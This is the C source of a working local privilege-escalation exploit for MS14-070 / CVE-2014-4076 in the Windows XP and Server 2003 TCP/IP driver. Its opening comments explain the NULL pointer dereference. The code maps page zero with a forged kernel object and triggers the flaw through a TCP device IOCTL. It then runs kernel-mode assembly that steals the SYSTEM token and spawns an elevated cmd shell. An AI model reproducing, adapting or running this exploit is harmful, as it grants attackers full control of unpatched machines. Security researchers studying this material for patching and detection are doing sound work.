//
// An exploit for the MS14-070 / CVE-2014-4076 (KB2989935), written by dev_zzo.
// Partially based on the original PoC [0] released by KoreLogic.
//
// Affected systems:
// + Windows Server 2003 R2 SP2 (x86, x64?)
// + Windows XP SP3 (x86, x64?)
//
// What is the root cause of the vulnerability?
//
// It is caused due to a NULL pointer dereference within the tcpip!SetAddrOptions()
// function. The NULL pointer comes from an internal object, it is not known
// how/when it can be altered to prevent exploitation.
//
// The function can be reached via IOCTL 0x00120028U called on \\.\Tcp file object.
// The IOCTL apparently requests an option to be set.
//
// The IOCTL accepts an input buffer of minimum 0x18 bytes, with certain values 
// required to reach the flawed code path and others having arbitrary values; 
// see code below. No value influences the follow-up exploitation.
//
// The internal object contains what appears to be a flag field at offset +0x28.
// Setting it to 0x38FFFF87U (provided by KoreLogic) allows for code execution.
// The SetAddrOptions() function invokes another function named ProcessAORequests()
// passing it the same internal object. The ProcessAORequests() function enters a loop 
// checking the flags against mask 0x00060007U. Another check within loop 
// verifies bit mask 0x00000004. If this is satisfied, the pointer at +0x10 is
// checked, if it is different from the address of itself (apparently, a single-linked
// loop list). If so, a list element is extracted. Then, a pointer at +0xEC is fetched
// and subsequently called. The pointer value is controlled by the attacker.
//
// References:
// [0] https://www.korelogic.com/Resources/Advisories/KL-001-2015-001.txt
// [1] https://technet.microsoft.com/en-us/library/security/ms14-070.aspx
//

#include <Windows.h>

#pragma comment(linker, "/entry:__mainCRTStartup")
#pragma comment(linker, "/subsystem:console")
#pragma comment(lib, "kernel32")

#define NTVER(maj, min, csd) ((maj << 24) | (min << 16) | (csd << 8))
// Windows 2000 SP4 UR1
//#define NTOS_TARGET_VER NTVER(5,0,4)
// Windows XP SP3
//#define NTOS_TARGET_VER NTVER(5,1,3)
// Windows Server 2003 R2 SP2
//#define NTOS_TARGET_VER NTVER(5,2,2)

typedef NTSYSAPI NTSTATUS (NTAPI *PNTALLOCATEVIRTUALMEMORY)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);
static PNTALLOCATEVIRTUALMEMORY NtAllocateVirtualMemory;

//
// Scrap CRT...
//

#pragma function(memset)
void *memset(void *ptr, int v, size_t num)
{
    char *p = (char *)ptr;
    while (num--)
        *p++ = 0;
    return ptr;
}

static size_t __strlen(const char *s)
{
    const char *p = s;
    while (*p) ++p;
    return p - s;
}

typedef int (__cdecl *pvsprintf)(char *buffer, const char *format, va_list argptr); 
static pvsprintf vsprintf; 

static void __puts(const char *text)
{
    DWORD charsWritten;
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), text, __strlen(text), &charsWritten, NULL);
}

static int __printf(const char *fmt, ...)
{
    char buffer[1024];
    int length;
    DWORD charsWritten;
    va_list args;

    va_start(args, fmt);
    length = vsprintf(buffer, fmt, args);
    WriteConsoleA(GetStdHandle(STD_OUTPUT_HANDLE), buffer, length, &charsWritten, NULL);
    va_end(args);
    return length;
}

static void GrabNtdllRoutines(void)
{
    HMODULE hNtdll;

    hNtdll = GetModuleHandleA("ntdll.dll");
    vsprintf = (pvsprintf)GetProcAddress(hNtdll, "vsprintf");
    NtAllocateVirtualMemory = (PNTALLOCATEVIRTUALMEMORY)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
}

static NTSTATUS MapPageZero(SIZE_T Size)
{
	PVOID BaseAddress = (PVOID)1;

	return NtAllocateVirtualMemory((PVOID)-1, &BaseAddress, 0, &Size, MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
}

// This is the object dereferenced with NULL

#if (NTOS_TARGET_VER == NTVER(5,0,4))

typedef struct {
/*0000*/BYTE __fog1[0x08];
/*0008*/DWORD Zero1; // RBZ
/*000C*/PVOID Ptr1;
/*0010*/PVOID Ptr2;
/*0014*/BYTE __fog2[0x10];
/*0024*/DWORD Flags;
/*0028*/BYTE __fog3[0xC];
/*0034*/WORD Zero2; // RBZ
/*0036*/BYTE __fog4[0xB2];
/*00E8*/PVOID CallbackPtr;
} OBJECT, *POBJECT;

#define SYSTEM_PID 8
#define OFFSET_KPCR_KTHREAD 0x124
#define OFFSET_KTHREAD_KPROCESS 0x44
#define OFFSET_EPROCESS_UNIQUEPID 0x9C
#define OFFSET_EPROCESS_APLINKS 0xA0
#define OFFSET_EPROCESS_TOKEN 0x12C

#elif (NTOS_TARGET_VER == NTVER(5,1,3))

typedef struct {
/*0000*/BYTE __fog1[0x08];
/*0008*/DWORD Zero1; // RBZ
/*000C*/PVOID Ptr1;
/*0010*/PVOID Ptr2;
/*0014*/BYTE __fog2[0x10];
/*0024*/DWORD Flags;
/*0028*/BYTE __fog3[0xC];
/*0034*/WORD Zero2; // RBZ
/*0036*/BYTE __fog4[0xB2];
/*00E8*/PVOID CallbackPtr;
} OBJECT, *POBJECT;

#define SYSTEM_PID 4
#define OFFSET_KPCR_KTHREAD 0x124
#define OFFSET_KTHREAD_KPROCESS 0x44
#define OFFSET_EPROCESS_UNIQUEPID 0x84
#define OFFSET_EPROCESS_APLINKS 0x88
#define OFFSET_EPROCESS_TOKEN 0xC8

#elif (NTOS_TARGET_VER == NTVER(5,2,2))

typedef struct {
/*0000*/BYTE __fog1[0x0C];
/*000C*/DWORD Zero1; // RBZ
/*0010*/PVOID Ptr1;
/*0014*/PVOID Ptr2;
/*0018*/BYTE __fog2[0x10];
/*0028*/DWORD Flags;
/*002C*/BYTE __fog3[0xC];
/*0038*/WORD Zero2; // RBZ
/*003A*/BYTE __fog4[0xB2];
/*00EC*/PVOID CallbackPtr;
} OBJECT, *POBJECT;

#define SYSTEM_PID 4
#define OFFSET_KPCR_KTHREAD 0x124
#define OFFSET_KTHREAD_KPROCESS 0x128
#define OFFSET_EPROCESS_UNIQUEPID 0x94
#define OFFSET_EPROCESS_APLINKS 0x98
#define OFFSET_EPROCESS_TOKEN 0xD8

#else
#error Please define NTOS_TARGET_VER.
#endif

static void TokenStealer(void)
{
    __asm {
        mov   eax, fs:[OFFSET_KPCR_KTHREAD]
        mov   eax, [eax + OFFSET_KTHREAD_KPROCESS]
        push  eax

aplinks_loop:
        mov   eax, [eax + OFFSET_EPROCESS_APLINKS]
        lea   eax, [eax - OFFSET_EPROCESS_APLINKS]
        cmp   dword ptr [eax + OFFSET_EPROCESS_UNIQUEPID], SYSTEM_PID
        jne   aplinks_loop

        mov   eax, [eax + OFFSET_EPROCESS_TOKEN]
        pop   edx
        mov   [edx + OFFSET_EPROCESS_TOKEN], eax
    }
}

static int PayloadExecuted = 0;

static void __stdcall Callback(POBJECT Obj, void *b)
{
    /* Executed in kernel mode */
    PayloadExecuted = 1;

    Obj->Flags &= ~0x00060007;
    TokenStealer();
    return;
}

static int SpawnCmd(void)
{
	STARTUPINFOA StartInfo;
	PROCESS_INFORMATION ProcInfo;
    BOOL Success;

    memset(&StartInfo, 0, sizeof(StartInfo));
    StartInfo.cb = sizeof(StartInfo);
	Success = CreateProcessA(
		NULL,
		"C:\\windows\\system32\\cmd.exe",
		NULL,
		NULL,
		TRUE,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&StartInfo,
		&ProcInfo);
    return Success;
}

static void Exploit(void)
{
    HANDLE hTcp;
    NTSTATUS Status;
    BOOL Success;
    DWORD IoctlInputBuffer[] = {
        0x00000400, /* Checked in TdiSetInformationEx(), must be 0x400 or 0x401 */
        0x00000000, /* Checked in TdiSetInformationEx(), must be 0 */
        0x00000200, /* Checked in TdiSetInformationEx(), must be 0x200 */
        0x00000200, /* Checked in TdiSetInformationEx(), must be 0x200 */
        0x00000022, /* Option? */
        0x00000004, /* Value length? */
        0x00010000, /* Value data? */
    };
    POBJECT Obj = NULL;

    GrabNtdllRoutines();

    __puts("\n[.] Opening the device... ");
    hTcp = CreateFileA(
        "\\\\.\\Tcp",
        0,
        FILE_SHARE_WRITE|FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);
    if (hTcp == INVALID_HANDLE_VALUE) {
        __printf("FAILED.\n[-] GetLastError() says: %p", GetLastError());
        return;
    }
    __puts("OK.");

    __puts("\n[.] Mapping page zero... ");
    Status = MapPageZero(0x4000);
    if (Status) {
        __printf("FAILED.\n[-] NTSTATUS is: %p", Status);
        return;
    }
    __puts("OK.");
    Obj->Zero1 = 0;
    Obj->Ptr1 = &Obj->Ptr2;
    Obj->Ptr2 = &Obj->Ptr1;
    Obj->Flags = 0x38FFFF87U;
    Obj->Zero2 = 0;
    Obj->CallbackPtr = &Callback;

    __puts("\n[.] Invoking IOCTL... ");
    Success = DeviceIoControl(
        hTcp,
        0x00120028U,
        IoctlInputBuffer, /* lpInBuffer */
        sizeof(IoctlInputBuffer), /* nInBufferSize */
        NULL, /* lpOutBuffer */
        0, /* nOutBufferSize */
        NULL, /* lpBytesReturned */
        NULL);
    if (!Success) {
        __printf("FAILED.\n[-] GetLastError() says: %p", GetLastError());
        return;
    }
    __puts("OK.");

    __puts("\n[.] Checking whether payload was actually executed... ");
    if (!PayloadExecuted) {
        __puts("NOPE.\n");
        __puts("[-] Sorry about this. Please report to the exploit author.\n");
        return;
    }
    __puts("YEP.");

    __puts("\n[.] Spawning the CMD shell... ");
    Success = SpawnCmd();
    if (!Success) {
        __printf("FAILED.\n[-] GetLastError() says: %p", GetLastError());
        return;
    }
    __puts("OK.");

    __puts("\n[+] Exploit successful.");
}

void __mainCRTStartup(void)
{
    __puts("\nExploit for MS14-070 / CVE-2014-4076\n");
    __puts("More at: https://github.com/dev-zzo/exploits-nt-privesc \n");

    __puts("\n[!] Exploit starting...");
    Exploit();

	__puts("\n[+] XOXO, dev_zzo.\n");
}
